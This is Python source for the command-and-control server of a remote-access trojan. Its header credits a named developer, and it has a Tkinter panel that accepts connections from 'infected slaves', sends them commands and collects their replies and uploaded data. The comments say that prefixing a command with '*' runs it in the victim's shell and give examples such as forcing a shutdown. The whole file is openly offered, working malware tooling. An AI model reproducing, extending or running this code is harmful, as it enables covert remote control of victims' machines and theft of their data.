# Developed By Mazzotti
#   devmazzotti@gmail.com
# You are responsible for your actions, I'm just sharing knowledge
# AVAIBLE COMMANDS AT THE MOMENT:
#
# FREEZE_MOUSE >> I think it's self explanatory
# UNFREEZE_MOUSE >> SAME
# * >> At the moment, it's the most important Tool. By initializing a Command with "*" U can run any command in the Client's CMD. ( EXAMPLES: (*shutdown -s -t 1 -c BYEE, *msg * Heyy, this trojan was made by devmazzotti@gmail.com) )
#
#
import time
import socket
from threading import Thread
from tkinter import *
import winsound

class Main(object):
    def __init__(self):
        self.status='Not Connected'
        self.ip='192.168.15.9' # YOUR LOCAL IP
        self.port= 2330 # YOUR PORT
        self.userslist=[]
        Thread(target=self.start_hosting).start()
        # Setting Graphical WIndow
        self.master = Tk()
        self.master.config(bg='BLACK',padx=20)
        #Events
        try:
            self.master.bind("<Return>", (lambda event: self.entry_command()))
        except:
            self.change_status('Something Went Wrong With <return> Event','RED')
        #
        self.L1=Label(self.master,text='Connected Users',bg='BLACK',fg='YELLOW')
        self.L1.grid(row=0,column=0,columnspan=1,padx=20)
        #
        self.LS1=Listbox(self.master,bg='BLACK',fg='GREEN',selectbackground='RED',width=30,height=40) # Connected users ListBox
        self.LS1.grid(row=1,column=0,padx=20)
        # Putting events in ListBox
        try:
            self.LS1.bind("<<ListboxSelect>>", lambda event : (self.change_status(self.LS1.get(self.LS1.curselection()),'yellow'))) # Responsible for sending
        except:
            self.change_status('Maybe something is wrong...','red')
        # ListBox Responsible for sending commands to the Victim
        self.LS2=Listbox(self.master,bg='BLACK',fg='PURPLE',selectbackground='BLACK',width=100,height=40) # Listbox of sended Commands
        self.LS2.grid(row=1,column=1,padx=20)
        #
        self.L2=Label(self.master,text='Commands',bg='BLACk',fg='YELLOW')
        self.L2.grid(row=0,column=1)
        #
        self.E1=Entry(self.master,bg='BLACK',fg='red',width=35)
        self.E1.grid(row=2,column=1)
        #
        self.L3=Label(self.master,text='>> {}'.format(self.status),bg='BLACK',fg='Green')
        self.L3.grid(row=3,column=0,columnspan=3,sticky=W)
        #
        self.LS3=Listbox(self.master,bg='BLACK',fg='GREEN',selectbackground='RED',width=150,height=40)
        self.LS3.grid(row=1,column=2,padx=20)
        #
        self.L4=Label(self.master,text='- Replies received -',bg='BLACK',fg='YELLOW')
        self.L4.grid(row=0,column=2)
        # MAIN LOOP #
        self.master.mainloop()
        # MAIN LOOP #
    def entry_command(self): # When sending a command with " Return " Key
        try:
            self.userslist[self.LS1.curselection()[0]].send(self.E1.get().encode()) # Send the message to Victim
            self.LS2.insert(END, 'TO ({}) >> {}'.format(self.LS1.get(self.LS1.curselection()), self.E1.get()))
            self.LS2.see(END)
            self.E1.delete(0,END)
        except:
            self.change_status('Something seems wrong.. maybe the slave is not here anymore...','RED')
    def change_status(self,text=Label,color=Label):
        self.status='>> {}'.format(text)
        self.L3.configure(text=self.status,fg=color)
    def start_hosting(self):
        self.tcp=socket.socket() # Setting to TCP
        self.tcp.bind((self.ip,self.port)) # Starting Host
        self.tcp.listen(10) # Setting for 10 connections
        while True: ## Waiting for connections
            self.con,self.client=self.tcp.accept()
            self.LS1.insert(END,self.client[0])
            self.userslist.append(self.con)
            self.change_status('A new slave has been infected..','YELLOW')
            winsound.Beep(2000,250)
            Thread(target=self.wait_response).start()
    def wait_response(self):
        while True:
            try:
                time.sleep(0.5)
                self.data = self.userslist[self.LS1.curselection()[0]].recv(1024)
                self.decdata = self.data.decode()
                if('*' in self.decdata):
                    self.LS3.insert(END,'SLAVE > {}'.format(self.data[1:]))
                elif('+' in self.decdata):
                    file=open('file','wb')
                    print(f'DATA In String >{self.decdata}')
                    print(f'DATA In Byte >{self.data}')
                    file.write(self.decdata[1:].encode())
                    file.close()
            except Exception as e: print(e)
Main()